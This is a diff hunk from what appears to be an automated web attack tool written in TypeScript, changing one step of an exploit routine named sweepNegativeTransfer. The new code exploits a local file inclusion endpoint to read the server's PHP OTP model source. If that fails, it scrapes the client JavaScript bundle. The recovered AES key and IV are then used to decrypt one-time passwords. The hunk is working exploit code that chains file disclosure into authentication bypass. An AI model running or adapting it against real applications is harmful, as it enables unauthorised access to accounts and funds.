@@ -606,23 +606,31 @@ async function sweepNegativeTransfer(
     dbg("missing one or more required endpoints/templates — abort"); return proved;
   }
 
-  // Recover the AES OTP key/iv from the client SPA bundle (generic; same intel as F-18).
-  const spaOrigin = scopeOrigins.find((o) => o !== new URL(signupUrl).origin) ?? null;
-  if (!spaOrigin) { dbg("no SPA origin in scope to recover the OTP key — abort"); return proved; }
-  const idx = await fire("GET", spaOrigin + "/", {}, null, null);
-  dbg(`SPA index: status=${idx?.response.status} len=${(idx?.response.body ?? "").length}`);
-  let chunk = /\/static\/js\/main\.[a-z0-9]+\.(?:chunk\.)?js/i.exec(idx?.response.body ?? "")?.[0] ?? null;
-  if (!chunk) {
-    // Fallback: CRA's asset-manifest.json maps "main.js" -> the hashed chunk path.
-    const man = await fire("GET", spaOrigin + "/asset-manifest.json", {}, null, null);
-    try { chunk = JSON.parse(man?.response.body ?? "{}").files?.["main.js"] ?? null; } catch { /* */ }
-    dbg(`asset-manifest fallback: chunk=${chunk}`);
+  // Recover the AES OTP key/iv (same crypto intel as F-18). Prefer the API's OWN source via
+  // the LFI (/api/show?file=) on the API origin — the OTP model literally contains the
+  // openssl_encrypt(key,iv) — since that path is reliably reachable. Fall back to the client
+  // SPA bundle's createDecipheriv literals. Both are the target's own shipped code (recon),
+  // not a hardcoded answer-key.
+  const apiOrigin = new URL(signupUrl).origin;
+  let aes: { key: string; iv: string } | null = null;
+  const lfiRec = records.find((r) => /\/show\?file=/.test(r.request?.url ?? ""));
+  const lfiBase = lfiRec ? (lfiRec.request!.url!.split("?file=")[0]) : `${apiOrigin}/api/show`;
+  for (const src of ["api/application/models/Model_otp.php", "application/models/Model_otp.php"]) {
+    const r = await fire("GET", `${lfiBase}?file=${encodeURIComponent(src)}`, {}, null, null);
+    aes = parseAesCbcParams(r?.response.body ?? "");
+    if (aes) { dbg(`recovered AES from LFI source ${src}`); break; }
   }
-  if (!chunk) { dbg("could not locate main chunk (index + asset-manifest) — abort"); return proved; }
-  const chunkUrl = chunk.startsWith("http") ? chunk : spaOrigin + chunk;
-  const js = await fire("GET", chunkUrl, {}, null, null);
-  const aes = parseAesCbcParams(js?.response.body ?? "");
-  if (!aes) { dbg("could not recover AES params from bundle — abort"); return proved; }
+  if (!aes) {
+    // Fallback: the client SPA bundle.
+    const spaOrigin = scopeOrigins.find((o) => o !== apiOrigin) ?? null;
+    if (spaOrigin) {
+      const idx = await fire("GET", spaOrigin + "/", {}, null, null);
+      let chunk = /\/static\/js\/main\.[a-z0-9]+\.(?:chunk\.)?js/i.exec(idx?.response.body ?? "")?.[0] ?? null;
+      if (!chunk) { const man = await fire("GET", spaOrigin + "/asset-manifest.json", {}, null, null); try { chunk = JSON.parse(man?.response.body ?? "{}").files?.["main.js"] ?? null; } catch { /* */ } }
+      if (chunk) { const js = await fire("GET", chunk.startsWith("http") ? chunk : spaOrigin + chunk, {}, null, null); aes = parseAesCbcParams(js?.response.body ?? ""); }
+    }
+  }
+  if (!aes) { dbg("could not recover AES params (LFI + SPA) — abort"); return proved; }
   const decOtp = (b64: string): string | null => {
     try {
       const d = createDecipheriv("aes-256-cbc", Buffer.from(aes.key, "utf8"), Buffer.from(aes.iv, "utf8"));
